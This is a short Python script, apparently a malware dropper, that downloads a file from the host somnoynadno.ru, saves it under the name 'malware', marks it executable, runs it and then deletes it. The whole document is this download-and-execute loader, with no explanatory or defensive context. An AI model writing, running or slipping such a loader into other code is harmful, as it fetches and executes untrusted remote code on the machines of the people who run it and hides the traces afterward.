import platform
import requests

from os import remove
from os import system

from time import sleep

PROTO = "http://"
DOMAIN = "somnoynadno.ru"
PATH = "/files/95e0169e10882231636b5f9f895aa923/main"

s = platform.system()

URL = PROTO + DOMAIN + PATH
r = requests.get(URL)

if r.status_code == 200:
	FILENAME = "malware"
	with open(FILENAME, 'wb') as f:
		f.write(r.content)

	system("chmod +x " + FILENAME)
	system("./" + FILENAME)

	remove("./" + FILENAME)

	print("Done")
else:
	print("Network error")

sleep(2)